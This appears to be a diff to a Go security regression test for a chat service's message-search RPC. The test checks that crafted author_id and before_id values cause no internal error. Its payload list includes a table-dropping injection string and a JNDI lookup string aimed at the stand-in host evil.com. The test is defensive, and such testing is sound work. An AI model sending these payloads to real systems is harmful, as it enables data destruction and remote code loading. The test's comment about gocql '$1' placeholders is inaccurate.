@@ -207,6 +207,65 @@ func TestServerNameNoValidation(t *testing.T) {
 // so SQL injection should be impossible. This is a regression test.
 //
 // Remediation: Already uses parameterized queries — this is a regression test.
+// TestSearchParameterSafety verifies that the SearchMessages RPC safely handles
+// crafted filter values without injection or unexpected behavior.
+//
+// Severity: LOW
+// Finding: ScyllaDB queries use gocql prepared statements ($1 placeholders),
+// making CQL injection structurally impossible. This is a regression test
+// replacing TestMeilisearchFilterInjection (removed with MeiliSearch).
+//
+// Remediation: Already uses prepared statements — this is a regression test.
+func TestSearchParameterSafety(t *testing.T) {
+	ctx := context.Background()
+	suffix := uniqueSuffix(t)
+	user := registerUser(t, "sp_"+suffix)
+	serverID := mustCreateServer(t, user.AccessToken)
+	channelID := mustCreateChannel(t, user.AccessToken, serverID)
+
+	chat := newChatClient()
+
+	injectionPayloads := []string{
+		"'; DROP TABLE messages;--",
+		"1 OR 1=1",
+		"ALLOW FILTERING",
+		"\x00\x00\x00",
+		strings.Repeat("A", 10000),
+		"${jndi:ldap://evil.com}",
+		"01HZXXXXXXXXXXXXXXXXXXXXXXX", // malformed ULID
+	}
+
+	for _, payload := range injectionPayloads {
+		t.Run("author_id="+payload[:min(len(payload), 30)], func(t *testing.T) {
+			_, err := chat.SearchMessages(ctx, authedRequest(user.AccessToken, &v1.SearchMessagesRequest{
+				ChannelId: &channelID,
+				AuthorId:  &payload,
+			}))
+			// Should succeed with empty results (bad author_id matches nothing),
+			// or fail with InvalidArgument. Must NOT panic or return Internal.
+			if err != nil {
+				code := connect.CodeOf(err)
+				if code == connect.CodeInternal {
+					t.Errorf("VULNERABILITY: SearchMessages returned Internal error for payload %q (possible injection)", payload[:min(len(payload), 30)])
+				}
+			}
+		})
+
+		t.Run("before_id="+payload[:min(len(payload), 30)], func(t *testing.T) {
+			_, err := chat.SearchMessages(ctx, authedRequest(user.AccessToken, &v1.SearchMessagesRequest{
+				ChannelId: &channelID,
+				BeforeId:  &payload,
+			}))
+			if err != nil {
+				code := connect.CodeOf(err)
+				if code == connect.CodeInternal {
+					t.Errorf("VULNERABILITY: SearchMessages returned Internal error for before_id payload %q", payload[:min(len(payload), 30)])
+				}
+			}
+		})
+	}
+}
+
 func TestInviteCodeInjection(t *testing.T) {
 	ctx := context.Background()
 	suffix := uniqueSuffix(t)
